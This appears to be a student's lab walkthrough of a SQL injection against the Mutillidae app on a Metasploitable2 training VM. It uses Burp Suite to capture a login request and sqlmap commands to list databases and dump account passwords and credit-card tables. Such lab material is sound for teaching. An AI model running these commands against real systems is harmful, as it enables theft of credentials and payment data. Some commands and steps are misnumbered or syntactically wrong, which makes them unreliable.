1) Kali Linux: ipconfig command is used to check the IP address: 192.168.100.7 and netmask:255.255.255.0

Metasploitable2: After logging in with msfadmin, we assign an IP address to the machine by using the 
same subnet and netmask. 
Command: sudo ifconfig eth0 192.168.100.2 netmask 255.255.255.0

3) Metasploitable2: Then login again with msfadmin and enter command: ifconfig to check if the IP is assigned.

4) Kali Linux: Try to ping with metasploitable2 just to check if IP has been assigned to it by using 
the command: ping

5)If we want to access metasploitable2 from Kali linux then open browser and type IP adddress of 
metasploitable2 i.e 192.168.100.2 and click enter. Then click on mutillidae and click on user info from
OWASP-> SQL injection option and a login page will appear.

6)Other than Kali linix and metasploitable2 we will use Burpsuite which is an indiceptive proxy which 
will capture request that we will use in sqlmap to enumerate the database to check if any vulnerabilities
are present in an application.
Open Burpsuite and check if intercept is on. It should be on.

7) Then in Kali Linux, open browser settings and change it 'manual proxy configuration'.

8) Then go to the login page opened previously and enter some random username and password and check in 
burpsuite if it has captured the request properly. In case it has the 'Upgrade Insecure Request' 
should be 1.

8) Save that data in a file on Desktop with the name extract.txt 

10) Kali Linux: Write command: sqlmap
Sqlmap is an open source software that is used to detect and exploit database vulnerabilities and provides 
option for injecting malicious code into them.

11) Then enter command: sqlmap -r /root/Desktop/extract.txt --dbs

12) It starts enumerating the data and shows different injection points from which we will select the 
default option i.e 0 and press enter.

13)It fetches the back-end DBS of mySQLand and database names. We will select one of them i.e owasp10 by
giving command: sqlmap -r /root/Desktop/extract.txt --owasp10 --tables  
This command fetches all the tables.

14) To see the the information of the accounts table we will use the 
command: sqlmap -r /root/Desktop/extract.txt -D owasp10 -T accounts --dump

15) Injection points are shown from which we select the default option 0 and press enter.

16) It fetches all the information of the accounts table including usernames, if the user is admin id 
or not, passwords and signatures.

17) To check credit cards information we use the 
command: sqlmap -r /root/Desktop/extract.txt -D owasp10 -T credit cards --dump
This shows all the information of the credit cards including ccv, ccnumber and expiration date.
